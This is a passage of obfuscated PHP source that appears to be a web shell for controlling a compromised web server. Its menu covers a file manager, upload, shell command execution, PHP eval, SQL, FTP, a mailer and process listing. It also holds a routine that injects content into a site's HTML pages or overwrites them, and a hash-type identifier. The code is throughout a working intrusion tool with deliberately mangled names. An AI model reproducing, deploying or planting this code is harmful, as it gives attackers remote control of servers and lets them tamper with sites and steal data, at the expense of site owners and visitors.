            if (!@preg_match('/<body[^>]*>/', $c, $m))
                return false;
            $p = @strpos($c, $m[0]);
            $p += @strlen($m[0]);
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'body4':
            $p = z3s($c, '</body>');
            if ($p === false)
                return false;
            $p += 7;
            $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
            break;
        case 'overwrite':
            $r = $inj;
            break;
        default:
            return false;
            break;
    }
    return z9t($f, $r);
}
function z3u(&$a, $k = '')
{
    if (@is_array($a)) {
        foreach ($a as $k => $v) {
            z3u($a["$k"]);
        }
    } else {
        if ($a == 'name' || $a == 'tmp_name')
            $a = z1j($a);
    }
}
function z8e($i, $o)
{
    $r = @create_function('$o', 'return @' . z7c($o, 0) . '($o);');
    return $r($i);
}
function z7v($n, $ac, $a, $b = 0)
{
    global $act;
    return z6l(z5x(array('act' => $ac, 'd', 'sort'), z8b($n, ($a ? '4' : '5'), ($act ==
        $ac && $b ? ' style="border-right:0;"' : ''))), '5');
}
function z0a($k)
{
    if (!@isset($_SESSION[$k]) || !@is_array($_SESSION[$k])) {
        z0i($k);
        $_SESSION[$k] = array();
        $_SESSION[$k][] = array('act' => z7z('2', 'default_act'));
    }
}
function z2d($k)
{
    if (@count($_SESSION[$k]) > 0)
        return @count($_SESSION[$k]);
    $_SESSION[$k][] = array('act' => z7z('2', 'default_act'));
    return @count($_SESSION[$k]);
}
function z0l()
{
    $p = array();
    if (@count($_POST) > 0) {
        foreach ($_POST as $n => $v) {
            if (@substr($n, 0, 5) != 'backf')
                $p[$n] = $v;
        }
    }
    return $p;
}
function z0f($k)
{
    $cleanp = z0l();
    if ($cleanp != z2m($k))
        $_SESSION[$k][] = $cleanp;
}
function z3f($k)
{
    $_SESSION[$k] = @array_reverse($_SESSION[$k]);
    @array_pop($_SESSION[$k]);
    $_SESSION[$k] = @array_reverse($_SESSION[$k]);
    z2t($k);
}
function z2m($k)
{
    $c = z2d($k);
    if ($c == 0)
        return array();
    if ($c > 0)
        z2t($k);
    $n = (($c > 1) ? ($c - 2) : (($c > 0) ? ($c - 1) : 0));
    return $_SESSION[$k][$n];
}
function z2t($k)
{
    $r = array();
    foreach ($_SESSION[$k] as $v)
        $r[] = $v;
    $_SESSION[$k] = $r;
}
function z5f($sk)
{
    global $backf, $white, $back_form_actions;
    z0a($sk);
    if (@isset($backf) && $backf) {
        @array_pop($_SESSION[$sk]);
    } elseif (!@isset($white) || !$white) {
        z0f($sk);
    }
    $back = z2m($sk);
    if (z2d($sk) > 10)
        z3f($sk);
    $a = array();
    if (@count($back) > 0) {
        $a['backf'] = '1';
        if (@is_array($back)) {
            foreach ($back as $k => $v) {
                $a['backf_' . $k] = @urlencode($v);
            }
        }
    }
    $back_form_actions = $a;
    return z6l(((@count($a) > 0) ? z5x($a, z8b(z9y("23"), '15')) : z8b(z9y("23"),
        '5')), '5');
}
function z0p()
{
    global $act, $sh_exec, $safe_exec, $bftp, $bmail;
    echo z7a(z7u(z5f('hist') . z7v(z9y("24"), "ls", (@in_array($act, array("ls", "d",
            "f", "dfunc")))) . z7v(z9y("25"), "search", ($act == "search")) . z7v(z9y("26"),
        "upload", ($act == "upload")) . (($sh_exec || $safe_exec) ? z7v(z9y("27"), "cmd",
        ($act == "cmd")) : '') . z7v(z9y("28"), "eval", ($act == "eval")) . ($bftp ? z7v
        (z9y("193"), "ftp", ($act == "ftp")) : '') . z7v(z9y("29"), "sql", ($act ==
        "sql")) . ($bmail ? z7v(z9y("30"), "mailer", ($act == "mailer")) : '') . z7v(z9y
        ("31"), "encoders", ($act == "encoders")) . z7v(z9y("32"), "tools", ($act ==
        "tools")) . ($sh_exec ? z7v(z9y("33"), "processes", ($act == "processes")) : '') .
        z7v(z9y("34"), "sysinfo", (@in_array($act, array("sysinfo", "phpinfo")))) . z7v
        ("&nbsp;", false, "")), '4');
}
function z8w($i, $s)
{
    return ($s) ? z7q(@substr($i[1], 4)) : z7q(@substr($i[1], 0, 4));
}
function z1j($t)
{
    $t = @str_replace('\\', '/', $t);
    if (@strstr($t, '//')) {
        while (@strstr($t, '//') !== false)
            $t = @str_replace('//', '/', $t);
    }
    return $t;
}
function z1k($t)
{
    $t = z1j($t);
    if (@substr($t, -1) != '/')
        $t .= '/';
    if (@preg_match('/[^\/\r\n"\']+\/\.\.\//', $t))
        $t = @preg_replace('/[^\/\r\n"\']+\/\.\.\//', '', $t);
    if ($t == '/../')
        $t = '/';
    if ($t != './' && @strstr($t, './') !== false)
        $t = @str_replace('./', '', $t);
    return $t;
}
function z2v($f, $t, $c)
{
    if (@strstr($c, $f))
        while (@strstr($c, $f))
            $c = @str_replace($f, $t, $c);
    return $c;
}
function z1n($action)
{
    global $d, $win;
    if (!$win)
        return '';
    $e = @explode("/", $d);
    $r = '';
    foreach (@range("B", "Z") as $let) {
        if ($let . ":" != @strtoupper($e[0]) && z4r($let . ":/")) {
            $r .= z5x(array("act" => $action, "d" => @strtoupper($let) . ":/"), z8b("[$let]",
                "1")) . z9x(2);
        }
    }
    return $r;
}
function z1m($t, $ftp = 0)
{
    global $win;
    $def = "/";
    if ($win && !$ftp) {
        $path = @realpath(__file__);
        $def = @substr($path, 0, 1) . ":/";
    }
    if (@substr($t, -1) == '/')
        $t = @substr($t, 0, -1);
    if (@empty($t))
        return array($def);
    $e = @explode('/', $t);
    $d = array();
    if ($win && !$ftp) {
        $p = '';
    } else {
        $p = '/';
    }
    for ($i = 0; $i < @count($e); $i++) {
        if (@empty($e[$i])) {
            $d['/'] = '/';
        } else {
            $p .= $e[$i] . '/';
            $d[$p] = $e[$i];
        }
    }
    return $d;
}
function z1v($n, $a = array(), $c = '', $g = '', $t = '1', $s = '')
{
    $r = '<select name="' . $n . '"' . ($c != '' ? ' class="' . z4m($c, '4') . '"' :
        '') . ($s != '' ? (@is_numeric($s) ? ' ' . z10r($s) : ' ' . $s) : '') . '>' . "\n";
    if ($g != '')
        global ${$n};
    foreach ($a as $k => $v) {
        $r .= '<option value="' . ($t == '1' ? $k : $v) . '"' . (($g != '' && ($t == '1' ?
            $k : $v) == ${$n}) ? ' selected' : '') . '>' . ($t == '1' ? $v : $k) .
            '</option>' . "\n";
    }
    $r .= '</select>';
    return $r;
}
function z3m($n, $a = array(), $c = '', $g = '', $s = '')
{
    return z1v($n, $a, $c, $g, '1', $s);
}
function z2k($n, $a = array(), $c = '', $g = '', $s = '')
{
    return z1v($n, $a, $c, $g, '0', $s);
}
function z8n($t = 0)
{
    global $d, $ftp_current_dir;
    $a = ((!$t || $t == 'l') ? z1m($d) : z1m($ftp_current_dir, 1));
    $c = @count($a);
    $i = 0;
    $n = '';
    foreach ($a as $k => $v) {
        $i++;
        $n .= z5x(($t === 0 ? array('act' => 'ls', 'd' => $k) : ($t == 'l' ? array('act' =>
                'ftp', 'd' => $k) : array('act' => 'ftp', 'd', 'ftp_current_dir' => $k))), z8b($v,
            '1') . (($v != '/' && $i != $c) ? ' / ' : ' '));
    }
    echo z10w(z7u(z7k((!$t ? z5x(array('act' => 'ls', 'd' => z3a(__file__)), z8h('small_home',
        '', '9')) . z9x() . z1n("ls") : '') . $n . (!$t ? ' (' . z6t(z9w(@fileperms($d)),
        z6g($d)) . ')' : ''))), '5');
}
function z2n()
{
    global $d;
    echo z3q(z10w(z7u(z6l(z5x(array('act' => 'f', 'd'), z7n(z9y("35")) . z6u('f', $d,
        '0') . z3m('ft', array('functions' => z9y("74"), 'edit' => z9y("75"), 'new' =>
            z9y("195")), '1') . z8b('&raquo;', '7')), '') . z6l(z5x(array('act' => 'd',
            'dold' => $d), z7n(z9y("36")) . z6u('d', $d, '0') . z3m('dt', array('chdir' =>
            z9y("425"), 'new' => z9y("195")), '1') . z8b('&raquo;', '7')), '')), '2'), '');
}
function z5r($s)
{
    $a = @preg_replace('/[^0-9]/', '', $s);
    if (@empty($a))
        $a = "0";
    $b = @substr($s, -1);
    if ($b != 'd')
        $b = 'a';
    return array($a, $b);
}
function z2b($a, $b)
{
    global $v;
    return @strnatcmp(@strtolower($a[$v]), @strtolower($b[$v]));
}
function z9h($d)
{
    global $with_ls;
    $r = array();
    $ls = @str_replace('\\', '', z9e('ls -a "' . $d . '" 2>/dev/null', 0));
    $e = @explode("\n", $ls);
    if (@count($e) > 0) {
        $with_ls = 1;
        foreach ($e as $p) {
            if ($p != '' && $p != $d && !@in_array($d . $p, $r))
                $r[] = $d . $p;
        }
    }
    return $r;
}
function z4s($pn, $t = 'f')
{
    if ($t == 'd') {
        $ls = @str_replace('\\', '', z9e('ls -dla "' . $pn . '" 2>/dev/null', 0));
    } else {
        $ls = @str_replace('\\', '', z9e('ls -la "' . $pn . '" 2>/dev/null', 0));
    }
    $el = @explode("\n", $ls);
    if (@count($el) > 0) {
        $l = $el[0];
    } else {
        $l = $ls;
    }
    if (@strstr($l, '->')) {
        $ll = @explode('->', $l);
        if (@count($ll) > 2) {
            @array_pop($ll);
            $l = @implode('->', $ll);
        } else {
            $l = @trim($ll[0]);
        }
    }
    $len = @strlen($l);
    $pnl = (@strlen($pn) + 1);
    if (@substr($l, -$pnl) == " " . $pn) {
        $pi = @substr($l, 0, ($len - $pnl));
        $pi = z2v('  ', ' ', $pi);
        $p2 = @explode(" ", $pi);
        if (@count($p2) > 5) {
            $pp = $p2[0];
            $pu = $p2[2];
            $pg = $p2[3];
            $ps = $p2[4];
            if (!@is_numeric($ps) && @substr($ps, -1) == "," && @is_numeric($p2[5])) {
                $ps .= $p2[5];
                $st = 6;
            } else {
                $st = 5;
            }
            if (@is_numeric($ps))
                $ps = z7x($ps);
            $pd = '';
            for ($i = $st; $i < @count($p2); $i++)
                $pd .= $p2[$i] . ' ';
            $pd = @trim($pd);
            if (z7e('strtotime') && ($s2t = @strtotime($pd)) !== false)
                $pd = @date("Y-m-d H:i", $s2t);
            if ($pp[0] == "l") {
                return array($pn, 'LINK', $pd, array($pu, $pg), $pp);
            } elseif ($pp[0] == "d") {
                return array($pn, 'DIR', $pd, array($pu, $pg), $pp);
            } else {
                return array($pn, $ps, $pd, array($pu, $pg), $pp);
            }
        }
    }
    return array('', '', '', array('', ''), '');
}
function z8x($d)
{
    global $nix, $sh_exec, $act, $lswf;
    $d = z1k($d);
    if (@substr($d, -1) != '/')
        $d .= '/';
    $r = array();
    $lswf = '';
    if (z7e('scandir') && ($h = @scandir($d))) {
        foreach ($h as $t)
            $r[] = $d . $t;
        $lswf = 'scandir';
    } elseif (z7e('dir') && ($h = @dir($d))) {
        while (($t = $h->read()) !== false)
            $r[] = $d . $t;
        $h->close();
        $lswf = 'dir';
    } elseif (z7e('opendir') && z7e('readdir') && z7e('closedir') && ($h = @opendir($d))) {
        while (($t = @readdir($h)) !== false)
            $r[] = $t;
        @closedir($h);
        $lswf = 'opendir';
    } elseif ($nix && $sh_exec && ($act == "ls" || $act == "search") && @count($r =
    z9h($d)) > 0) {
        $lswf = 'ls';
        return $r;
    } elseif (z7e('glob') && ($h = @glob($d . '*')) !== false) {
        if (@count($h) > 0) {
            foreach ($h as $t)
                $r[] = $t;
        }
        if (($h = @glob($d . '.*')) !== false && @count($h) > 0) {
            foreach ($h as $t)
                $r[] = $t;
        }
        if (@count($r) > 0 && !@in_array($d . '.', $r))
            $r[] = $d . '.';
        if (@count($r) > 0 && !@in_array($d . '..', $r))
            $r[] = $d . '..';
        $lswf = 'glob';
    }
    if (@count($r) > 0)
        @sort($r);
    return $r;
}
function z8c()
{
    return (@isset($value) ? $value : 'unknown');
}
function z4i()
{
    global $use_images, $use_buffer, $act, $bcopy, $bcut, $showbuf, $d, $with_ls, $lswf,
        $filter;
    $f_a = array('all' => z9y("37"), 'dirs' => z9y("38"), 'files' => z9y("39"),
            'archives' => z9y("40"), 'exes' => z9y("41"), 'php' => z9y("42"), 'html' => z9y
            ("43"), 'text' => z9y("44"), 'images' => z9y("45"), 'other' => z9y("46"));
    $fs = '';
    foreach ($f_a as $fk => $f)
        $fs .= z5x(array('act', 'd', 'showbuf', 'filter' => $fk), z8b($f, (((@isset($filter) &&
            $filter == $fk) || (!@isset($filter) && $fk == 'all')) ? '17' : '16')));
    $ba = z5x(array('act', 'd', 'use_buffer' => ($use_buffer ? '0' : '1')), z8b(($use_buffer ?
        z9y("50") : z9y("49")), '16'));
    if ($use_buffer && (@count($bcopy) > 0 || @count($bcut) > 0)) {
        $bbcopy = (@count($bcopy) > 0);
        $bbcut = (@count($bcut) > 0);
        $ba .= z5x(array('act' => 'ls', 'd', 'emptybuf' => '1'), z8b(z9y("51"), '16')) . ((!
            @isset($showbuf) || !$showbuf) ? z5x(array('act' => 'ls', 'd', 'showbuf' => '1'),
            z8b(z9y("52"), '16')) . ($bbcopy ? z5x(array('act' => "d", 'd', 'dt' =>
                'bpastecopy', 'showbuf'), z8b(z9y("54"), '16')) : '') . ($bbcut ? z5x(array('act' =>
                "d", 'd', 'dt' => 'bpastecut', 'showbuf'), z8b(z9y("55"), '16')) : '') . (($bbcopy &&
            $bbcut) ? z5x(array('act' => "d", 'd', 'dt' => 'bpasteall', 'showbuf'), z8b(z9y
            ("56"), '16')) : '') : z5x(array('act' => 'ls', 'd'), z8b(z9y("53"), '16')));
    }
    if (!@isset($lswf))
        $lswf = '';
    echo z10w(z7u(z6l($fs . z5x(array('act', 'd', 'showbuf', 'use_images' => ($use_images ?
            '0' : '1')), z8b(($use_images ? z9y("48") : z9y("47")), '16')) . $ba, '11')),
        '7');
}
function z1q($t, $filter, $tt)
{
    global $index;
    if (z2l($t) == '..')
        return 1;
    switch ($filter) {
        case 'dirs':
            return ($tt == 'd');
        case 'files':
            return ($tt == 'f' || $tt == 'e');
        case 'exes':
            return ($tt == 'e' || (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @
                implode('|', @array_merge($index['cmd'], $index['pl'])) . ')$/i', $t)));
        case 'archives':
            return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['tar']) .
                ')$/i', $t));
        case 'php':
            return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['php']) .
                ')$/i', $t));
        case 'html':
            return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['html']) .
                ')$/i', $t));
        case 'text':
            return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', @
                array_merge($index['txt'], $index['wri'], $index['doc'])) . ')$/i', $t));
        case 'images':
            return (($tt == 'f' || $tt == 'e') && @preg_match('/\.(' . @implode('|', $index['jpg']) .
                ')$/i', $t));
        case 'other':
            return ($tt == 'f' && !@preg_match('/\.(' . @implode('|', @array_merge($index['tar'],
                $index['php'], $index['html'], $index['jpg'], $index['txt'], $index['wri'], $index['doc'],
                $index['cmd'], $index['pl'])) . ')$/i', $t));
        default:
            return 1;
    }
}
function z0o($f, $t = '', $d = 0)
{
    global $use_buffer, $bcut, $bcopy, $with_ls, $external, $bziparchive, $reg_archives,
        $nix, $sh_exec;
    if ($d == 0) {
        $d = z3a($f);
    } else {
        global $d;
    }
    $f = z2l($f);
    $a = array();
    $a['functions'] = z9y("74");
    $a['edit'] = z9y("75");
    if (@isset($reg_archives) && $reg_archives != '') {
        if (@preg_match('/\.(' . $reg_archives . ')$/', $f, $m)) {
            if (@isset($m[1])) {
                if ($m[1] != "zip" || ($m[1] == "zip" && $nix && $sh_exec))
                    $a['extract'] = z9y("478", $m[1]);
                if ($m[1] == "zip" && $bziparchive)
                    $a['extractzip'] = z9y("478", "zip (php)");
            }
        }
    }
    if ($use_buffer && (!@isset($with_ls) || !$with_ls) && (!@isset($external) || !
        $external)) {
        $a['bcopy'] = (@in_array($f, $bcopy) ? z9y("69") : z9y("67"));
        $a['bcut'] = (@in_array($f, $bcut) ? z9y("70") : z9y("68"));
    }
    $a['delete'] = z9y("72");
    if (!@isset($external) || !$external)
        $a['rename'] = z9y("73");
    $a['download'] = z9y("76");
    return z5x(array('act' => 'f', 'f' => $f, 'd' => $d, 'showbuf'), z3m('ft', $a,
        '3') . z8b('&raquo;', '6'), $t);
}
function z1r($tt, $t = '')
{
    global $use_buffer, $bcopy, $bcut, $with_ls, $showbuf;
    $a = array();
    $a['chdir'] = z9y("425");
    $a['functions'] = z9y("74");
    if ($use_buffer && (!@isset($with_ls) || !$with_ls)) {
        $a['bcopy'] = (@in_array($tt, $bcopy) ? z9y("69") : z9y("67"));
        $a['bcut'] = (@in_array($tt, $bcut) ? z9y("70") : z9y("68"));
        if (!@isset($showbuf) || !$showbuf) {
            if (@count($bcopy) > 0)
                $a['bpastecopy'] = z9y("54");
            if (@count($bcut) > 0)
                $a['bpastecut'] = z9y("55");
            if (@count($bcopy) > 0 && @count($bcut) > 0)
                $a['bpasteall'] = z9y("56");
        }
    }
    $a['rename'] = z9y("73");
    $a['delete'] = z9y("72");
    return z5x(array('act' => 'd', 'd', 'tt' => $tt, 'showbuf'), z3m('dt', $a, '3') .
        z8b('&raquo;', '6'), $t);
}
function z0z($d, $t)
{
    return z5x(array('act' => 'd', 'd' => $d), z3m('dt', array('chdir' => z9y("425")),
        '3') . z8b('&raquo;', '6'), $t);
}
function z0w($d)
{
    return z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd' => $d), z3m('chdir',
        array('' => z9y("425")), '3') . z8b('&raquo;', '6'));
}
function z0q($t)
{
    return z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $t), z3m('ft',
        array('chdir' => z9y("425")), '3') . z8b('&raquo;', '6'));
}
function z0t($t)
{
    return z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'lt' => $t), z3m('ft',
        array('upload' => z9y("197"), 'delete' => z9y("199")), '3') . z8b('&raquo;', '6'));
}
function z0r($t)
{
    return z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rt' => $t), z3m('ft',
        array('download' => z9y("198"), 'delete' => z9y("199")), '3') . z8b('&raquo;',
        '6'));
}
function z4r($t)
{
    if (z4e($t) || z4j($t) || z4q($t) || z1y($t) || z0n($t) || z5i($t))
        return 1;
    return 0;
}
function z2i($f, $t)
{
    global $nix, $sh_exec;
    if (@file_exists($f)) {
        if ($t == 'f')
            return @is_file($f);
        if ($t == 'd')
            return @is_dir($f);
        if ($t == 'L')
            return @is_link($f);
        if ($t == 'r')
            return @is_readable($f);
        if ($t == 'w')
            return @is_writable($f);
        if ($t == 'x')
            return @is_executable($f);
    } elseif ($nix && $sh_exec) {
        $h = z9e('if [ -' . $t . ' "' . $f .
            '" ]; then echo "istrue"; else echo "isfalse"; fi', 0);
        return (@strstr($h, "istrue") && !@strstr($h, "isfalse"));
    }
    return 0;
}
function z4e($f)
{
    return z2i($f, 'f');
}
function z4j($f)
{
    return z2i($f, 'd');
}
function z4q($f)
{
    return z2i($f, 'L');
}
function z1y($f)
{
    return z2i($f, 'r');
}
function z0n($f)
{
    return z2i($f, 'w');
}
function z5i($f)
{
    return z2i($f, 'x');
}
function z7q($i)
{
    $r = '';
    for ($n = 0; $n < @strlen($i); $n++)
        $r .= z8i(z8i($i[$n], 1) - z8i(1, 1), 2);
    return $r;
}
function z5o()
{
    echo @str_repeat('', 1024);
    @ob_flush();
    @flush();
}
function z4u($t, $s)
{
    $l = @strlen($s);
    if (@substr($t, -$l) == $s) {
        while (@substr($t, -$l) == $s)
            $t = @substr($t, 0, (@strlen($t) - $l));
    }
    return $t;
}
function z1f($t, $s = '/')
{
    $t = z1j($t);
    $t = z4u($t, $s);
    if (!@strstr($t, $s))
        return array();
    $e = @explode($s, $t);
    $f = $e[(@count($e) - 1)];
    $l = (@strlen($t) - @strlen($f));
    $d = @substr($t, 0, $l);
    return array(z1k($d), $f);
}
function z3a($t, $s = '/')
{
    $e = z1f($t, $s);
    return (@count($e) == 2 ? $e[0] : './');
}
function z2l($t, $s = '/')
{
    $e = z1f($t, $s);
    return (@count($e) == 2 ? $e[1] : $t);
}
function z3q($a, $s = '')
{
    $r = '';
    if (@is_array($a)) {
        for ($i = 0; $i < @count($a); $i++)
            $r .= z7k($a[$i], '12', (($i == 0) ? '2' . $s : (($i == (@count($a) - 1)) ? '3' .
                $s : $s)));
    } else {
        $r = z7k($a, '12', '23' . $s);
    }
    return z10w(z7u($r), '3');
}
function z1p($c, $e = '')
{
    $s = '';
    global $index;
    $i = $index;
    $a = array();
    if ($e != '') {
        foreach ($a as $k => $v) {
            if (@in_array($e, $v)) {
                $s = $k;
                break;
            }
        }
    }
    if ($s == '')
        $s = $e;
    if (@in_array($s, array('db', 'sql', 'pl', 'cgi', 'c', 'cc', 'cpp', 'h', 'hpp',
            'icl', 'ipp'))) {
        $c = @highlight_string('<?php' . $c . '?>', true);
        $p1 = @stripos($c, '&lt;?php');
        $a = @substr($c, 0, $p1);
        $b = @substr($c, $p1 + 8);
        $c = $a . $b;
        $p2 = @strripos($c, '?&gt;');
        $a = @substr($c, 0, $p2);
        $b = @substr($c, $p2 + 5);
        $c = $a . $b;
    } else {
        $c = @highlight_string($c, true);
    }
    $c = @str_replace(array('<font color="', '</font>'), array('<span style="color: ',
            '</span>'), $c);
    $c = @preg_replace('/(\r|\n)/', '', $c);
    echo '<pre><code>' . $c . '</code></pre>';
}
function z4d($f)
{
    global $filealiases;
    $r = array();
    if (@strstr($f, '/'))
        $f = z2l($f, '/');
    $ext = @strtolower(z2l($f, '.'));
    foreach ($filealiases as $k => $v) {
        if (@in_array($ext, $v))
            $r[] = $k;
    }
    return @array_unique($r);
}
function z4x($f)
{
    $a = z4d($f);
    $o = array('code', 'text');
    if (@count($a) > 0) {
        if (@count($a) > 1) {
            foreach ($a as $ft) {
                if (@in_array($ft, $o))
                    return $ft;
            }
            return $a[0];
        } else {
            return $a[0];
        }
    } else {
        return '';
    }
}
function z3r($s)
{
    if (!@preg_match('/[A-Z]/i', $s))
        return $s;
    $s = @strtolower($s);
    for ($i = 0; $i < @strlen($s); $i++) {
        if (@preg_match('/[a-z]/', $s[$i])) {
            $s[$i] = @strtoupper($s[$i]);
            return $s;
        }
    }
    return $s;
}
function z3e($p)
{
    return @decbin(@hexdec($p));
}
function z4a($p)
{
    return @dechex(@bindec($p));
}
function z0x($p)
{
    $r = '';
    for ($i = 0; $i < @strLen($p); $i += 2) {
        $r .= @chr(@hexdec($p[$i] . $p[$i + 1]));
    }
    return $r;
}
function z1i($p)
{
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i)
        $r .= @sprintf('%02X', @ord($p[$i]));
    return @strtoupper($r);
}
function z0b($p)
{
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i)
        $r .= "\\x" . @sprintf('%02X', @ord($p[$i]));
    return @chunk_split($r);
}
function z0v($p)
{
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i)
        $r .= "\\x" . @sprintf('%02X', @ord($p[$i]));
    return @substr(@preg_replace('/.{1,76}/', "'\\0'.\n", $r), 0, -2);
    return @chunk_split($r);
}
function z0y($p)
{
    $r = '';
    for ($i = 0; $i < @strlen($p); ++$i)
        $r .= '%' . @dechex(@ord($p[$i]));
    return @strtoupper($r);
}
function z4v($i)
{
    return @chunk_split(@base64_encode($i));
}
function z4p($i)
{
    return @substr(@preg_replace('/.{1,76}/', "'\\0'.\n", @base64_encode($i)), 0, -
        2);
}
function z3p($t)
{
    $r = '';
    if (@preg_match_all('/(?<strings>[\x20-\x7E]{4,})[^\x20-\x7E]?/', $t, $m)) {
        foreach ($m["strings"] as $s) {
            $r .= $s . "\r\n";
        }
    }
    return $r;
}
function z1e()
{
    $encode_functions = array();
    foreach (array("z3p" => "Strings", "urlencode" => "Urlencode", "urldecode" =>
            "Urldecode", "z0y" => "Full Urlencode", "rawurlencode" => "Rawurlencode",
            "rawurldecode" => "Rawurldecode", "base64_encode" => "Base64 Encode", "z4v" =>
            "Base64 Encode + Chunk", "z4p" => "Base64 Encode + Chunk + Quotes",
            "base64_decode" => "Base64 Decode", "z1i" => "ASCII to HEX", "z0b" =>
            "ASCII to HEX + Chunk", "z0x" => "HEX to ASCII", "z_hexdec" => "HEX to DEC",
            "z3e" => "HEX to BIN", "dechex" => "DEC to HEX", "decbin" => "DEC to BIN", "z4a" =>
            "BIN to HEX", "bindec" => "BIN to DEC", "strtolower" => "String to lowercase",
            "strtoupper" => "String to UPPERCASE", "htmlspecialchars" => "Htmlspecialchars",
            "strlen" => "String Length", "strrev" => "Reverse String") as $key => $val) {
        if (z7e($key) || z7e(@substr($key, 0, @strlen($key) - 1))) {
            $encode_functions[$key] = "$val";
        }
    }
    return $encode_functions;
}
function z4o($h)
{
    return (@preg_match('/^[0-9a-fA-F]+$/', $h) ? 1 : 0);
}
function z1g($h)
{
    return (@preg_match('/^[0-9a-zA-Z+\/.]+==$/', $h) ? 1 : 0);
}
function z2e($h)
{
    $l = @strlen($h);
    $r = 'Unknown';
    if ($l === 32) {
        if (z4o($h)) {
            $r = 'MD5 / MD4 / MD2 / NTLM / Tiger128 / SNEFRU128 / RipeMD128 / Haval128_3 / Haval128_4 / Haval128_5 / Domain Cached Credentials';
        } elseif (@preg_match('/^[0-9A-F]+$/', $h)) {
            $r = 'Windows-LM / Windows-NTLM / RC4';
        } elseif (@preg_match('/^[0-9a-zA-Z+\/.]+$/', $h)) {
            $r = 'Haval192 (Base64) / Tiger-192 (Base64)';
        }
    } elseif ($l === 40) {
        if (z4o($h)) {
            $r = 'SHA-0 / SHA-1 / Tiger160 / RipeMD160 / MySQL v5.x / Haval160 / Haval160_3 / Haval160_4 / Haval160_5';
        }
    } elseif ($l === 8) {
        if (z4o($h)) {
            $r = 'ADLER32 / CRC-32 / CRC-32B / GHash-32-3 / GHash-32-3';
        }
    } elseif ($l === 13) {
        if (@preg_match('/^[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'DES (Unix)';
        }
    } elseif ($l === 16) {
        if (z4o($h)) {
            $r = 'MySQL';
        }
    } elseif ($l === 4) {
        if (z4o($h)) {
            $r = 'CRC-16 / CRC-16-CCITT / FCS-16';
        }
    } elseif ($l === 34) {
        if (@preg_match('/^\$1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/', $h)) {
            $r = 'MD5 (Unix)';
        } elseif (@preg_match('/^\$P\$B[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'MD5(WordPress)';
        } elseif (@preg_match('/^\$H\$9[0-9a-zA-Z\/.]$/', $h)) {
            $r = 'MD5(PhpBB3)';
        }
    } elseif ($l === 128) {
        if (z4o($h)) {
            $r = 'SHA-512 / WHIRLPOOL / SALSA20';
        }
    } elseif ($l === 96) {
        if (z4o($h)) {
            $r = 'SHA-384';
        }
    } elseif ($l === 48) {
        if (z4o($h)) {
            $r = 'Haval192 / Haval192_4 / Haval192_5 / Tiger192 / Tiger2 / SALSA10';
        }
    } elseif ($l === 56) {
        if (z4o($h)) {
            $r = 'Haval224 / Haval244_3 / Haval244_4 / SHA224';
        }
        if (z1g($h)) {
            $r = 'RipeMD320 (Base64)';
        }
    } elseif ($l === 64) {
        if (z4o($h)) {
            $r = 'SNEFRU256 / SHA-256 / RipeMD256 / Panama / Haval256 / Haval256_3 / Haval256_4 / Haval256_5';
        } elseif (@preg_match('/^[0-9a-zA-Z+\/.]+$/', $h)) {
            $r = 'SHA384 (Base64)';
        }
    } elseif ($l === 37) {
        if (@preg_match('/^\$apr1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/', $h)) {
            $r = 'MD5 (APR)';
        }
    } elseif ($l === 80) {
        if (z4o($h)) {
            $r = 'RipeMD320';
        }
    } elseif ($l === 24) {
        if (z1g($h)) {
            $r = 'Haval128 (Base64) / MD2 (Base64) / MD4 (Base64) / MD5 (Base64) / RipeMD128 (Base64) / SNEFRU128 (Base64) / Tiger128 (Base64)';
        }
    } elseif ($l === 28) {
        if (@preg_match('/^[0-9a-zA-Z+\/.]+=$/', $h)) {
            $r = 'SHA-1 (Base64) / Haval160 (Base64) / RipeMD160 (Base64) / Tiger160 (Base64)';
        }
    } elseif ($l === 44) {
        if (@preg_match('/^[0-9a-zA-Z+\/.]+=$/', $h)) {
            $r = 'Haval256 (Base64) / RipeMD256 (Base64) / SHA256 (Base64) / SNEFRU256 (Base64)';
        }
    } elseif ($l === 88) {
        if (z1g($h)) {
            $r = 'SHA512 (Base64) / WHIRLPOOL (Base64)';
        }
    } elseif ($l === 9) {
        if (@is_numeric($h)) {
            $r = 'Elf-32';
        }
    }
    return $r;
}
function z3i()
{
    global $tmonth_arr, $tday_arr, $tyear_arr, $thour_arr, $tmin_arr, $tsec_arr;
    $tmonth_arr = array("" => "Month");
    $tday_arr = array("" => "Day");
    $tyear_arr = array("" => "Year");
    $thour_arr = array("" => "Hour");
    $tmin_arr = array("" => "Min");
    $tsec_arr = array("" => "Sec");
    foreach (array("January", "February", "March", "April", "May", "June", "July",
            "August", "September", "October", "November", "December") as $tmm)
        $tmonth_arr[$tmm] = $tmm;
    for ($i = 1; $i <= 31; $i++)
        $tday_arr[$i] = $i;
    for ($i = 1998; $i <= @date("Y"); $i++)
        $tyear_arr[$i] = $i;
    for ($i = 1; $i <= 24; $i++)
        $thour_arr[$i] = $i;
    for ($i = 1; $i < 60; $i++) {
        $tmin_arr[$i] = $i;
        $tsec_arr[$i] = $i;
    }
}
function z2q()
{
    global $nix, $sh_exec, $ft, $d, $f;
    $r = '';
    $a = array('functions' => z9y("74"), 'edit' => z9y("75"), 'text' => z9y("79"),
            'code' => z9y("80"), 'html' => z9y("81"), 'htmls' => z9y("82"), 'exe' => z9y("83"),
            'sess' => z9y("84"), 'sdb' => z9y("85"), 'ini' => z9y("86"), 'img' => z9y("87"),
            'hex' => z9y("88"));
    if (($wwwdir = z3n()) !== false) {
        if (@strstr($d . $f, $wwwdir) !== false) {
